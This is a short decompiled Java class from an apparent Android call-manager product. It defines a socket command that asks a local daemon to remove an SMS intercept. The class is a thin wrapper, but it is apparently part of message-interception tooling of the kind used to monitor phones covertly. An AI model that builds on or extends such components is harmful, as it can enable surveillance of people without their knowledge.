package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.base.communication.SmsInterceptInfo;

public class RemoteRemoveSmsIntercept
  extends SocketCmd
{
  private static final long serialVersionUID = 5677132510122180774L;
  
  public RemoteRemoveSmsIntercept(SmsInterceptInfo paramSmsInterceptInfo)
  {
    super(paramSmsInterceptInfo, Boolean.class);
  }
  
  protected String getServerName()
  {
    return "com.fx.socket.callmgrd";
  }
  
  protected String getTag()
  {
    return "RemoteRemoveSmsIntercept";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/ref/command/RemoteRemoveSmsIntercept.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */